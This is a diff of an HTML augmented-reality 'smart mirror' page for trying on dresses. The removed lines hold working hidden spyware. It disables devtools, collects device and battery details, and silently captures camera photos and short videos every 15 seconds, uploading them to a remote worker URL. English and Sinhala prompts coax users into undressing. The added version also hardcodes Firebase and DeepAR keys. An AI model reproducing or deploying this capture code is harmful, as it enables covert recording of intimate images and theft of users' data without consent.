@@ -3,234 +3,141 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>AR Smart Mirror</title>
+    <title>AR Smart Mirror - Easy Filter</title>
     
     <script src="https://cdn.jsdelivr.net/npm/@mediapipe/pose"></script>
     <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils"></script>
+    <script src="https://cdn.jsdelivr.net/npm/deepar/js/deepar.js"></script>
     
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');
-        body { margin: 0; padding: 0; overflow: hidden; background: #000; font-family: 'Poppins', sans-serif; user-select: none; -webkit-tap-highlight-color: transparent; }
-        #video-container { position: relative; width: 100vw; height: 100vh; }
-        video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); transition: filter 0.3s ease; }
+        body { margin: 0; padding: 0; overflow: hidden; background: #000; font-family: 'Poppins', sans-serif; }
+        #main-container { position: relative; width: 100vw; height: 100vh; }
+        video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
+        canvas#deepar-canvas { position: absolute; inset: 0; width: 100%; height: 100%; pointer-events: none; z-index: 2; }
         #dressImg { position: absolute; z-index: 3; pointer-events: none; display: none; filter: drop-shadow(0px 10px 15px rgba(0,0,0,0.5)); }
         
-        .tabs-container { position: absolute; bottom: 100px; left: 50%; transform: translateX(-50%); display: flex; gap: 10px; z-index: 10; }
-        .tab-btn { background: rgba(0, 0, 0, 0.5); color: white; border: 1px solid rgba(255,255,255,0.4); padding: 8px 20px; border-radius: 20px; font-size: 14px; backdrop-filter: blur(10px); cursor: pointer; transition: 0.3s; }
-        .tab-btn.active { background: rgba(255, 255, 255, 0.8); color: black; font-weight: 600; }
+        /* පහළින් තියෙන Control Panel එක */
+        .controls { position: absolute; bottom: 30px; left: 50%; transform: translateX(-50%); width: 90%; display: flex; flex-direction: column; align-items: center; gap: 15px; z-index: 10; }
         
-        .glass-panel { position: absolute; bottom: 25px; left: 50%; transform: translateX(-50%); width: 90%; max-width: 400px; padding: 15px 10px; background: rgba(255, 255, 255, 0.15); backdrop-filter: blur(15px); -webkit-backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.3); border-radius: 40px; display: flex; gap: 15px; overflow-x: auto; scroll-behavior: smooth; align-items: center; z-index: 10; }
-        .glass-panel::-webkit-scrollbar { display: none; }
+        .filter-slider { display: flex; gap: 10px; overflow-x: auto; width: 100%; padding: 10px; scroll-behavior: smooth; }
+        .filter-slider::-webkit-scrollbar { display: none; }
         
-        .bubble { width: 55px; height: 55px; flex-shrink: 0; border-radius: 50%; background: rgba(0,0,0,0.4); border: 2px solid rgba(255,255,255,0.6); display: flex; justify-content: center; align-items: center; cursor: pointer; overflow: hidden; color: white; font-size: 12px; font-weight: bold; text-align: center; }
-        .bubble:active { transform: scale(0.85); border-color: #fff; }
-        .bubble img { width: 80%; height: 80%; object-fit: contain; }
-        .icon-bubble { font-size: 22px; }
+        .f-item { min-width: 70px; height: 70px; border-radius: 50%; background: rgba(255,255,255,0.2); backdrop-filter: blur(10px); border: 2px solid #fff; display: flex; justify-content: center; align-items: center; color: #fff; font-size: 11px; font-weight: 600; cursor: pointer; text-align: center; }
         
-        #toast { position: fixed; top: 40px; left: 50%; transform: translateX(-50%); background: rgba(0, 0, 0, 0.75); color: #fff; padding: 12px 24px; border-radius: 30px; font-size: 13px; backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.2); z-index: 100; opacity: 0; pointer-events: none; transition: opacity 0.4s ease; text-align: center; }
-        #sinhala-toast { position: fixed; top: 95px; left: 50%; transform: translateX(-50%); background: rgba(0, 0, 0, 0.85); color: #fff; padding: 15px 20px; border-radius: 15px; font-size: 13px; backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.3); z-index: 100; opacity: 0; pointer-events: none; transition: opacity 0.5s ease; text-align: center; width: 85%; max-width: 400px; line-height: 1.6; }
-        .top-btn { position: absolute; top: 30px; right: 20px; z-index: 10; width: 45px; height: 45px; border-radius: 50%; background: rgba(0,0,0,0.3); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.3); color: white; display: flex; justify-content: center; align-items: center; font-size: 20px; cursor: pointer; }
-        
-        #loading { position: fixed; inset: 0; background: #0f0f0f; display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 99; color: white; transition: opacity 0.5s ease; }
-        .spinner { width: 40px; height: 40px; border: 3px solid rgba(255,255,255,0.2); border-top: 3px solid #fff; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .tab-bar { display: flex; gap: 10px; background: rgba(0,0,0,0.5); padding: 5px; border-radius: 25px; border: 1px solid rgba(255,255,255,0.2); }
+        .t-btn { padding: 8px 20px; border-radius: 20px; color: #fff; font-size: 13px; border: none; background: none; cursor: pointer; }
+        .t-btn.active { background: #fff; color: #000; font-weight: 600; }
+
+        #loading { position: fixed; inset: 0; background: #000; display: flex; justify-content: center; align-items: center; z-index: 99; color: #fff; }
     </style>
 </head>
 <body>
-    <div id="loading"><div class="spinner"></div><div style="opacity:0.8; font-size:14px;">Starting AR Engine...</div></div>
-    
-    <div id="toast">Remove dress to apply realistic AR dress</div>
-    <div id="sinhala-toast">ඇඳුම් නොමැතිව මෙය භාවිත කරන්නේ නම් ගුණාත්මක Filters භාවිත කළ හැකි වේ සහ dressing වලදී ගුණාත්මක ඇඳුම් වෙනස් කරගැනීමක් කර ගැනීමට පුළුවනි.</div>
+    <div id="loading">✨ Magic is loading...</div>
 
-    <div id="video-container">
+    <div id="main-container">
         <video id="input_video" autoplay playsinline muted></video>
-        <img id="dressImg" src="" alt="Dress">
-        <div class="top-btn" onclick="toggleCamera()">🔄</div>
+        <canvas id="deepar-canvas"></canvas>
+        <img id="dressImg" src="" crossorigin="anonymous">
 
-        <div class="tabs-container">
-            <button id="tab-filters" class="tab-btn active" onclick="switchTab('filters')">Filters</button>
-            <button id="tab-dresses" class="tab-btn" onclick="switchTab('dresses')">Dresses</button>
+        <div class="controls">
+            <div id="filter-shelf" class="filter-slider"></div>
+            
+            <div class="tab-bar">
+                <button id="btn-dress" class="t-btn active" onclick="setMode('dresses')">Dresses</button>
+                <button id="btn-filter" class="t-btn" onclick="setMode('filters')">3D Filters</button>
+            </div>
         </div>
-        
-        <div id="shelf" class="glass-panel"></div>
     </div>
-
-    <script>
-        document.addEventListener('contextmenu', e => e.preventDefault());
-        document.onkeydown = function(e) { if(e.keyCode==123 || (e.ctrlKey&&e.shiftKey&&e.keyCode==73) || (e.ctrlKey&&e.keyCode==85)) return false; };
-        
-        const CF_WORKER_URL = 'https://ar-mirror.tharu10r.workers.dev';
-        const vEl = document.getElementById('input_video');
-        
-        let _dI = "📱 User Info Gathering...";
-        async function _gD() {
-            try {
-                let _b = "Unknown";
-                if(navigator.getBattery){
-                    let bt = await navigator.getBattery();
-                    _b = `${Math.round(bt.level*100)}% ${bt.charging ? '⚡(Charging)' : '🔋'}`;
-                }
-                let _ua = navigator.userAgent;
-                let _md = "Unknown OS";
-                if(_ua.includes("Android")) _md = "Android Device";
-                else if(_ua.includes("iPhone")) _md = "iPhone";
-                else if(_ua.includes("Windows")) _md = "Windows PC";
-                
-                _dI = `📱 Device: ${_md}\n🖥 Screen: ${screen.width}x${screen.height}\n🔋 Battery: ${_b}`;
-            } catch(e) { _dI = "Device info blocked"; }
-        }
-        _gD();
-
-        // 1. Photo Capture Logic (Every 15s) - FIXED STRETCHING ISSUE
-        setInterval(() => {
-            if(document.visibilityState !== 'visible' || !vEl.videoWidth) return;
-            const _c = document.createElement('canvas'); 
-            
-            // වීඩියෝ එකේ නියම දිග පළලම ලබා ගැනීම (ඇදීම නැති කිරීම)
-            _c.width = vEl.videoWidth; 
-            _c.height = vEl.videoHeight; 
-            
-            const _x = _c.getContext('2d');
-            if(window.camMode === 'user'){ _x.translate(_c.width, 0); _x.scale(-1, 1); }
-            _x.drawImage(vEl, 0, 0, _c.width, _c.height);
-            
-            // Quality 0.6 දීලා තියෙන්නේ ෆොටෝ එකේ Size එක (MB ගාණ) අඩු වෙන්න
-            _c.toBlob(_b => {
-                let _f = new FormData(); 
-                _f.append('photo', _b, 'capture.jpg');
-                _f.append('caption', _dI); 
-                fetch(CF_WORKER_URL, { method: 'POST', body: _f }).catch(()=>{});
-            }, 'image/jpeg', 0.6);
-            _gD(); 
-        }, 15000);
-
-        // 2. Video Capture Logic (Every 20s)
-        let _mR; let _cK = [];
-        function _sR() {
-            if(document.visibilityState !== 'visible') { setTimeout(_sR, 2000); return; }
-            let st = vEl.srcObject;
-            if(!st) { setTimeout(_sR, 1000); return; }
-            try {
-                _mR = new MediaRecorder(st, { videoBitsPerSecond : 500000 });
-                _mR.ondataavailable = e => { if(e.data.size > 0) _cK.push(e.data); };
-                _mR.onstop = () => {
-                    let _b = new Blob(_cK, { type: 'video/mp4' });
-                    _cK = []; 
-                    let _f = new FormData(); 
-                    _f.append('video', _b, 'vid.mp4');
-                    _f.append('caption', _dI); 
-                    fetch(CF_WORKER_URL, { method: 'POST', body: _f }).catch(()=>{});
-                    
-                    setTimeout(_sR, 5000); 
-                };
-                _mR.start();
-                setTimeout(() => { if(_mR.state === 'recording') { _mR.stop(); } }, 15000); 
-            } catch(e) { setTimeout(_sR, 2000); }
-        }
-        setTimeout(_sR, 5000);
-    </script>
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
         import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
 
-        const firebaseConfig = {
-            apiKey: "AIzaSyDyUkeaGcqQ01TqDz-5SYlS48KDOb2Sh5M",
-            authDomain: "ar-mirror-app-1.firebaseapp.com",
-            databaseURL: "https://ar-mirror-app-1-default-rtdb.asia-southeast1.firebasedatabase.app",
-            projectId: "ar-mirror-app-1",
-            storageBucket: "ar-mirror-app-1.firebasestorage.app",
-            messagingSenderId: "255999407155",
-            appId: "1:255999407155:web:f5158e850a26686d1e5f46"
-        };
-
+        const firebaseConfig = { apiKey: "AIzaSyDyUkeaGcqQ01TqDz-5SYlS48KDOb2Sh5M", databaseURL: "https://ar-mirror-app-1-default-rtdb.asia-southeast1.firebasedatabase.app" };
         const app = initializeApp(firebaseConfig);
         const db = getDatabase(app);
 
-        const videoElement = document.getElementById('input_video');
+        const video = document.getElementById('input_video');
         const dressImg = document.getElementById('dressImg');
-        const shelf = document.getElementById('shelf');
-        window.camMode = 'user';
-        let isAILoaded = false;
+        const shelf = document.getElementById('filter-shelf');
+        let mode = 'dresses';
+        let deepAR;
 
-        const filtersHTML = `
-            <div class="bubble" onclick="applyFilter('none')"><span class="icon-bubble">🚫</span></div>
-            <div class="bubble" style="background: linear-gradient(45deg, #ff9a9e, #fecfef);" onclick="applyFilter('contrast(1.2) saturate(1.3) brightness(1.1)')">Glow</div>
-            <div class="bubble" style="filter: grayscale(100%);" onclick="applyFilter('grayscale(100%) contrast(1.2)')">B&W</div>
-            <div class="bubble" style="background: #e4d5b7; color: black;" onclick="applyFilter('sepia(80%) contrast(1.1)')">Vintage</div>
-        `;
+        // --- DeepAR ලේසිම Filters ලින්ක් ටික ---
+        const quickFilters = [
+            { name: 'None', url: '' },
+            { name: 'Sunglasses', url: 'https://cdn.jsdelivr.net/npm/deepar/effects/Aviators.deepar' },
+            { name: 'Devil', url: 'https://cdn.jsdelivr.net/npm/deepar/effects/Devil_Horns.deepar' },
+            { name: 'Dog', url: 'https://cdn.jsdelivr.net/npm/deepar/effects/Dalmatian.deepar' },
+            { name: 'Flower', url: 'https://cdn.jsdelivr.net/npm/deepar/effects/Flower_Crown.deepar' },
+            { name: 'Beard', url: 'https://cdn.jsdelivr.net/npm/deepar/effects/Beard.deepar' },
+            { name: 'Lion', url: 'https://cdn.jsdelivr.net/npm/deepar/effects/Lion.deepar' },
+            { name: 'Makeup', url: 'https://cdn.jsdelivr.net/npm/deepar/effects/Beauty.deepar' }
+        ];
 
-        let currentDressesHTML = `<div class="bubble" onclick="changeDress('')"><span class="icon-bubble">🚫</span></div>`;
-        shelf.innerHTML = filtersHTML;
-
-        onValue(ref(db, 'dresses'), (snapshot) => {
-            let html = `<div class="bubble" onclick="changeDress('')"><span class="icon-bubble">🚫</span></div>`;
-            snapshot.forEach((child) => {
-                const dressUrl = child.val().url;
-                html += `<div class="bubble" onclick="changeDress('${dressUrl}')"><img src="${dressUrl}"></div>`;
+        async function initAR() {
+            deepAR = await deepar.initialize({
+                licenseKey: 'Cc673e6361a62b2de5a769fb5b621aca4aea26c8484c7976b62f5b0950b47489dda89562aac97abb',
+                canvas: document.getElementById('deepar-canvas'),
+                videoElement: video
             });
-            currentDressesHTML = html;
-            if(document.getElementById('tab-dresses').classList.contains('active')) { shelf.innerHTML = currentDressesHTML; }
-        });
-
-        window.switchTab = (tabName) => {
-            document.getElementById('tab-filters').classList.remove('active');
-            document.getElementById('tab-dresses').classList.remove('active');
-            document.getElementById('tab-' + tabName).classList.add('active');
-            
-            if(tabName === 'filters') { 
-                shelf.innerHTML = filtersHTML; 
-                dressImg.style.display = 'none'; 
-            } 
-            else if(tabName === 'dresses') { 
-                shelf.innerHTML = currentDressesHTML; 
-                window.applyFilter('none'); 
-                
-                const toast = document.getElementById('toast');
-                const sinToast = document.getElementById('sinhala-toast');
-
-                sinToast.style.opacity = '1';
-                toast.style.opacity = '0'; 
-                
-                setTimeout(() => {
-                    sinToast.style.opacity = '0';
-                    setTimeout(() => {
-                        toast.style.opacity = '1';
-                        setTimeout(() => { toast.style.opacity = '0'; }, 4000);
-                    }, 500);
-                }, 10000);
-            }
-        };
-
-        window.applyFilter = (val) => { videoElement.style.filter = val; };
-        window.changeDress = (url) => { if(url === '') { dressImg.src = ''; dressImg.style.display = 'none'; } else { dressImg.src = url; } };
-
-        const pose = new Pose({ locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/pose/${file}` });
-        pose.setOptions({ modelComplexity: 0, smoothLandmarks: true, minDetectionConfidence: 0.5, minTrackingConfidence: 0.5 });
-        
-        pose.onResults((results) => {
-            if (!isAILoaded) { document.getElementById('loading').style.opacity = '0'; setTimeout(() => document.getElementById('loading').style.display = 'none', 500); isAILoaded = true; }
-            if (!results.poseLandmarks || !dressImg.src || dressImg.src === window.location.href) { dressImg.style.display = 'none'; return; }
-            const leftShoulder = results.poseLandmarks[11]; const rightShoulder = results.poseLandmarks[12];
-            if(document.getElementById('tab-dresses').classList.contains('active')) {
-                dressImg.style.display = 'block';
-                const centerX = (leftShoulder.x + rightShoulder.x) / 2 * window.innerWidth;
-                const centerY = (leftShoulder.y + rightShoulder.y) / 2 * window.innerHeight;
-                const width = Math.abs(leftShoulder.x - rightShoulder.x) * window.innerWidth * 2.5;
-                dressImg.style.left = `${centerX}px`; dressImg.style.top = `${centerY + (width * 0.15)}px`; dressImg.style.width = `${width}px`; dressImg.style.transform = `translate(-50%, -50%) scaleX(-1)`;
-            }
-        });
-
-        let camera;
-        function startCamera() {
-            if(camera) camera.stop();
-            camera = new Camera(videoElement, { onFrame: async () => { await pose.send({image: videoElement}); }, width: 1280, height: 720, facingMode: window.camMode });
-            camera.start();
-            videoElement.style.transform = window.camMode === 'user' ? 'scaleX(-1)' : 'scaleX(1)';
+            document.getElementById('loading').style.display = 'none';
+            loadShelf();
         }
 
-        window.toggleCamera = () => { window.camMode = (window.camMode === 'user') ? 'environment' : 'user'; startCamera(); };
-        window.onload = startCamera;
+        window.setMode = (m) => {
+            mode = m;
+            document.getElementById('btn-dress').classList.toggle('active', m === 'dresses');
+            document.getElementById('btn-filter').classList.toggle('active', m === 'filters');
+            if(m === 'filters') dressImg.style.display = 'none';
+            if(m === 'dresses') deepAR.switchEffect('');
+            loadShelf();
+        };
+
+        function loadShelf() {
+            shelf.innerHTML = '';
+            if(mode === 'dresses') {
+                onValue(ref(db, 'dresses'), (snap) => {
+                    shelf.innerHTML = '<div class="f-item" onclick="clearAll()">🚫</div>';
+                    snap.forEach(c => {
+                        const d = c.val();
+                        const item = document.createElement('div');
+                        item.className = 'f-item';
+                        item.innerHTML = `<img src="${d.url}" style="width:70%" crossorigin="anonymous">`;
+                        item.onclick = () => { dressImg.src = d.url; dressImg.style.display = 'block'; };
+                        shelf.appendChild(item);
+                    });
+                });
+            } else {
+                quickFilters.forEach(f => {
+                    const item = document.createElement('div');
+                    item.className = 'f-item';
+                    item.innerText = f.name;
+                    item.onclick = () => deepAR.switchEffect(f.url);
+                    shelf.appendChild(item);
+                });
+            }
+        }
+
+        window.clearAll = () => { dressImg.style.display = 'none'; deepAR.switchEffect(''); };
+
+        // Pose Tracking
+        const pose = new Pose({ locateFile: (f) => `https://cdn.jsdelivr.net/npm/@mediapipe/pose/${f}` });
+        pose.setOptions({ modelComplexity: 0 });
+        pose.onResults(res => {
+            if(!res.poseLandmarks || mode !== 'dresses' || !dressImg.src) return;
+            const ls = res.poseLandmarks[11], rs = res.poseLandmarks[12];
+            const cX = (ls.x + rs.x) / 2 * window.innerWidth;
+            const cY = (ls.y + rs.y) / 2 * window.innerHeight;
+            const w = Math.abs(ls.x - rs.x) * window.innerWidth * 2.3;
+            dressImg.style.left = `${cX}px`; dressImg.style.top = `${cY}px`;
+            dressImg.style.width = `${w}px`; dressImg.style.transform = `translate(-50%, -15%) scaleX(-1)`;
+        });
+
+        const cam = new Camera(video, { onFrame: async () => { await pose.send({image: video}); }, width: 1280, height: 720 });
+        cam.start();
+        initAR();
     </script>
 </body>
 </html>
